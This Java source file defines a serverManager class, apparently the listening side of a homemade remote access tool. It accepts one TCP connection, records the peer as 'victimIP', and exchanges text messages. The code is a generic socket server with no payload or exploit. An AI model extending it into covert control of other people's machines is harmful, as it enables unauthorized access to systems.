/*
 * Click nbfs://nbhost/SystemFileSystem/Templates/Licenses/license-default.txt to change this license
 * Click nbfs://nbhost/SystemFileSystem/Templates/Classes/Class.java to edit this template
 */
package rutserver;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.IOException;
import java.net.ServerSocket;
import java.net.Socket;

/**
 *
 * @author javii
 */
public class serverManager {
    private boolean status = false;
    private String victimIP = "NOT CONNECTED";
    private int port = 0;
    private ServerSocket server = null;
    private Socket client = null;
    private DataInputStream input = null;
    private DataOutputStream output = null;
    
    public void StartListening(int port){
        try{
        setPort(port);
        server = new ServerSocket(this.port);
        client = server.accept();
        input = new DataInputStream(client.getInputStream());
        output = new DataOutputStream(client.getOutputStream());
        victimIP = client.getInetAddress().getHostName();
        status = true;
        }catch(IOException a){
        }
    }
    public boolean isClosed(){
        boolean isClosed = false;
        isClosed = client.isClosed();
        return isClosed;
    }

    public String getVictimIP() {
        return victimIP;
    }
    
    
    public void Send(String message) throws IOException{
        output.writeUTF(message);
    }
    public String Recive() throws IOException{
        String decoder = "ERROR";
        decoder = input.readUTF();
        return decoder;
    }

    public void setPort(int port) {
        if (port>0 && port <= 65535){
            this.port = port;
        }else{
            this.port = 6666;
        }
    }
    
    public void closeConnection() throws IOException{
        input.close();
        output.close();
        server.close();
        client.close();
        status = false;
        port = 0;
        victimIP = "NO CONNECTED";
        
    }
    @Override
    public String toString(){
        String mensaje = "DISCONNECTED";
        if (status == true){
            mensaje = "CONNECTED";
        }
        return ("The server status is : " + mensaje);
    }

    public String getPort() {
        String puerto = Integer.toString(this.port);
        return puerto;
    }
}
